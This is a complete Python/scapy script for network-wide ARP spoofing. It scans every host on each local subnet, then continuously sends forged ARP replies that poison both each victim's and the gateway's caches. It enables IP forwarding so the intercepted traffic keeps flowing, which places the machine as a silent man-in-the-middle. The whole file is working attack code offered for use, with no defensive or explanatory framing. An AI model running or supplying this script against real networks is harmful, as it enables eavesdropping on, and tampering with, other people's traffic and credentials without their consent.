import scapy.all as scapy
import threading
import time
import netifaces
import ipaddress
import os


GATEWAY_IP = '10.6.0.254'


def get_mac(ip: str):
    try:
        ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
                        scapy.ARP(pdst=ip), timeout=2, verbose=False)[0]
    except Exception:
        return None
    else:
        if len(ans) == 0:
            return None
        return ans[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def trick(victim_ip: str):
    if get_mac(victim_ip) is None:
        return None
    while True:
        print('attack', victim_ip)
        spoof(victim_ip, GATEWAY_IP)
        spoof(GATEWAY_IP, victim_ip)
        time.sleep(2)


if __name__ == '__main__':
    t_list = list()
    for ifname in netifaces.interfaces():
        if ifname != 'lo':
            addr = netifaces.ifaddresses(ifname)[netifaces.AF_INET][0]['addr']
            mask = netifaces.ifaddresses(
                ifname)[netifaces.AF_INET][0]['netmask']
            iface = ipaddress.IPv4Interface(f'{addr}/{mask}')
            network = ipaddress.ip_network(iface.network)
            for ip in network:
                if str(ip) == GATEWAY_IP:
                    continue
                t_list.append(threading.Thread(
                    target=trick, args=[str(ip)]))

    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    for t in t_list:
        t.start()
